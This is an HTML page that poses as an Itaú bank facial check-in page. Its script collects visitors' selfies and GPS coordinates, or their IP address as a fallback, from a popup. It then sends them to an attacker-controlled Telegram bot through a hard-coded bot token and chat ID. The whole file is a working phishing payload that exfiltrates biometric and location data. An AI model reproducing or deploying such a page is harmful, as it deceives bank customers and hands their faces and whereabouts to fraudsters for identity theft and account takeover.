<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <title>Itaú – Check-in Facial</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,Helvetica,sans-serif}
    button{padding:14px 28px;background:#003d82;color:#fff;border:none;border-radius:4px;font-size:18px;cursor:pointer}
    button:disabled{background:#888}
  </style>
</head>
<body>
  <button id="btn" onclick="abrirCheckin()">Fazer Check-in Facial</button>

  <script>
    // CONFIGURAÇÕES DO TELEGRAM
    const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
    const CHAT_ID = '-1003187104876';

    // abre popup
    function abrirCheckin(){
      const popup = window.open('popup.html','ck','width=400,height=600');
      if(!popup){ alert('⚠️ Popup bloqueado. Permita pop-ups e tente de novo.'); }
      document.getElementById('btn').disabled = true;
      setTimeout(()=> document.getElementById('btn').disabled = false, 8000); // libera depois de 8 s
    }

    // escuta dados vindos do popup
    window.addEventListener('message', async (ev)=>{
      if(ev.origin !== location.origin) return;
      if(ev.data.type === 'negado'){ alert('Permissão de câmera negada.'); return; }
      if(ev.data.type !== 'selfiesDone') return;

      const {selfies,locationData,ipFallback} = ev.data.dados;
      const hora = new Date().toLocaleString('pt-BR');

      // monta mensagem para o Telegram
      let texto = `🔴 Novo check-in – ${hora}\n`;
      if(locationData){
        texto += `📍 GPS Lat: ${locationData.lat.toFixed(6)}  Lng: ${locationData.lon.toFixed(6)}\n`;
      }else{
        texto += `📍 GPS negado – IP: ${ipFallback}\n`;
      }

      // 1) envia texto + local
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({chat_id:CHAT_ID,text:texto})
      });

      // 2) envia cada foto (selfie)
      for(let idx=0; idx<selfies.length; idx++){
        // converte base64 para blob
        const byteString = atob(selfies[idx].split(',')[1]);
        const mime = selfies[idx].split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for(let i=0;i<byteString.length;i++) ia[i]=byteString.charCodeAt(i);
        const blob = new Blob([ab],{type:mime});

        // upload como multipart/form-data
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', blob, `selfie_${idx+1}.jpg`);
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:'POST',body:fd});
      }
    });
  </script>
</body>
</html>
